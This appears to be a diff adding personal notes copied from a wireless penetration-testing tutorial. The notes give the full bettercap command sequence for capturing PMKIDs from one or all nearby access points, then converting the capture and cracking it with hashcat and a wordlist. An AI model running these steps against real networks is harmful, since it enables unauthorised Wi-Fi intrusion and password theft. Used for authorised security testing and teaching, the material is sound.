@@ -1,0 +1,46 @@
+sudo bettercap -eval "caplets.update; ui.update; quit"
+
+From <https://github.com/evilsocket/pwnagotchi/issues/946> 
+
+
+nextpc@nextpc:~/wifite2$ sudo bettercap -eval "caplets.update; ui.update; quit"
+[sudo] password for nextpc:
+bettercap v2.32.0 (built for linux amd64 with go1.18.1) [type 'help' for a list of commands]
+
+PMKID capture using bettercap
+For this final method, we will use a good old bettercap. This tool requires an older version of the pcap library so, we’ll first download that using wget. 
+wget http://old.kali.org/kali/pool/main/libp/libpcap/libpcap0.8_1.9.1-4_amd64.deb
+dpkg -i libpcap0.8_1.9.1-4_amd64.deb
+
+
+Now that it’s installed and our adapter is in monitor mode, we’ll run bettercap
+bettercap
+set wifi.interface wlan0mon
+wifi.recon on
+We’ll see all the APs in range  
+
+
+We’ll display this a little bit more clearly using:
+wifi.show
+
+
+We now need to associate with an access point using the BSSID. 
+wifi.assoc 68:14:01:5a:0e:9c
+As you can see, PMKID is captured now in /root/bettercap-wifi-handshakes.pcap file.  
+
+
+Similarly, if you want to capture PMKID of all the Access Points, 
+wifi.assoc all
+
+
+We now need to convert this pcap file in Hashcat format and crack it as we did before, so: 
+hcxpcaptool -z hashpmkid bettercap-wifi-handshake.pcap
+hashcat -m 16800 --force hashpmkid /usr/share/wordlists/rockyou.txt --show
+
+
+And that’s how it’s done! 
+
+From <https://www.hackingarticles.in/wireless-penetration-testing-pmkid-attack/> 
+
+https://www.hackingarticles.in/wireless-penetration-testing-bettercap/
+
